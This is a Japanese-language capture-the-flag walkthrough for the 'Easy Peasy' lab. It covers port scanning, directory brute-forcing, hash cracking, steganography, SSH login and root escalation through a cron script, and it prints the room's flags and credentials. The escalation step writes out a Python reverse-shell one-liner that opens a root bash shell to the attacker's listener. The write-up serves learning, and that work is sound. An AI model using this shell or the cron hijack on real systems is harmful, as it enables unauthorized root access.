# Easy Peasy

## About the CTF
NmapやGobusterなどのツールを使用してシステムに侵入する、
個人的にダメダメでした。。。
カンニングした部分も多々ありますが、後学のためにまとめておきます！

## Writeup
---  
### Task 1  Enumeration through Nmap
まずはnmap!
```
nmap -sV <IP> -p0-65535

~~~~~~~~~~
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Task1の問題はこれで全部答えられそう！

- 1.How many ports are open?  `3`
- 2.What is the version of nginx?  `1.16.1`
- 3.What is running on the highest port?  `Apache`

---
### Task 2  Compromising the machine
- 1.Using GoBuster, find flag 1.
gobusterを使用して隠されたディレクトリを探す。
```
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -t 100

/hidden               (Status: 301) [Size: 169]
/index.html           (Status: 200) [Size: 612]                                  
/robots.txt           (Status: 200) [Size: 43]  
```
`/hidden`のhttp response codeが301でリダイレクトされていることがわかる。  
`/hidden`に対して再度`gobuster`を実行する。
```
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -t 100

/index.html           (Status: 200) [Size: 390]
/whatever             (Status: 301) [Size: 169]
```
`/whatever`を発見。  
続けて`/whatever`に対して`gobuster`をかけてみるも、何も見つからない。  
バックグラウンドのイメージにヒントがあるのかなと思って、htmlをダウンロードしてみる。  
なんか意味深なものを発見。  
`<p hidden="">ZmxhZ3tmMXJzN19mbDRnfQ==</p>`  
Base64でdecodeする。  
```
echo "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 -d

flag{f1rs7_fl4g}
```

一丁上がり！ `flag{f1rs7_fl4g}`

- 2.Further enumerate the machine, what is flag 2?  
`Port:65524`に対してgobusterを実行する。
```
gobuster dir -u http://<IP>:65524 -w /usr/share/wordlists/dirb/common.txt -t 100

~~~~~~~~
/.hta                 (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 10818]
/robots.txt           (Status: 200) [Size: 153]  
/server-status        (Status: 403) [Size: 280]  
~~~~~~~~
```
ディレクトリは特に見つからないが、`robots.txt`を確認してみる。
Chromeで`http://<IP>:65524/robots.txt`にアクセス。

```
[robots.txt]

User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```
User-Agentの部分が答えかな〜。
32文字なのでmd5 hashかな。
サイトによって答えが出てこないのが辛いところ。[ここ](https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250)は出てくる。

`flag{1m_s3c0nd_fl4g}`

- 3.Crack the hash with easypeasy.txt, What is the flag 3?  
`http://<IP>:65524`にアクセスする。
Apacheのデフォルトページだけど実はそうじゃないらしい。
`view-source:http://<IP>:65524`でソースコードを表示し`flag`で検索をかけるとヒット！

`flag{9fdafbd64c47471a8f54cd3fc64cd312}`

- 4.What is the hidden directory?  
`view-source:http://<IP>:65524`で`hidden`で検索をかけると、`its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu`なる記述が。
[Cyberchef](https://gchq.github.io/CyberChef/)で`ba`から始まるdecodeを片っぱしから試してみる。
`base62`で意味ありげな文字列が出てきたのでこれが答えっぽい。

`/n0th1ng3ls3m4tt3r`

- 5.Using the wordlist that provided to you in this task crack the hash. What is the password?  
`http://<IP>:65524/n0th1ng3ls3m4tt3r`にアクセスする。
なんか文字があるので、これをクラックするのか。`940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81`
ヒントを確認すると、`Gost hash`なるものらしい。
`john the ripper`で解読する。ワードリストは与えられた`easypeasy.txt`を使う。

```
john --format=gost --wordlist=./easypeasy.txt ./hash.txt

~~~~~~~~
mypasswordforthatjob (?)     
~~~~~~~~
```
*hash.txtは解析対象のhashを記述したテキストファイル。

`mypasswordforthatjob`

- 6.What is the password to login to the machine via SSH?  
`http://<IP>:65524/n0th1ng3ls3m4tt3r`にあった画像ファイルを調べてみる。  
(苦戦した〜。binwalkとsteghide,zstagの使い分けを勉強しよう。)
パスワードは前問の答えを使う。

```
steghide extract -sf binarycodepixabay.jpg -p mypasswordforthatjob
```
出来上がったファイルの中身を確認する、
```
cat secrettext.txt 

username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```
passwordの部分はcyberchefでデコード（from binary）する。

`iconvertedmypasswordtobinary`

- 7.What is the user flag?  
前問でsshのユーザー名とパスワードが判明したので、ターゲットに向けてsshをかける。
```
ssh boring@<IP> -p 6498
password : iconvertedmypasswordtobinary
```
boringのホームディレクトリを確認すると、`user.txt`があったので、中身を確認するとflagを発見。
`flag{n0wits33msn0rm4l}`

- 8.What is the root flag?  
sudo使えるか調べてみる。
```
sudo -l

Sorry, user boring may not run sudo on kral4-PC.
```
ダメっぽい。この時点でSUIDを使うとかは選択肢から消える（？）   
`/etc/crontab`を確認してみる。
```
cat /etc/crontab

~~~~~~~~~~~~~~~~~~~~~~
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```
一番下のジョブが使えそうな気がする。
`.mysecretcronjob.sh`を確認してみる。
```
cat /var/www/.mysecretcronjob.sh 

#!/bin/bash
# i will run as root
```
ここにrevers shell仕掛ける系だ〜。
python3が使えるみたいなので、以下のコマンドを`.mysecretcronjob.sh`に記述する。
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LOCAL IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
*言語ごとのrevers shellは改めてまとめよう。

revers shellのコマンドはcronで勝手に実行されるので、ローカルPCで待ち受けよう。(MAC用)
```
nc -lvc -p 4444 
```
revers shellが成立したら、`/root`を探索して、`.root.txt`を発見。
```
cat /root/.root.txt

flag{63a9f0ea7bb98050796b649e85481845}
```
`flag{63a9f0ea7bb98050796b649e85481845}`

おしまいです。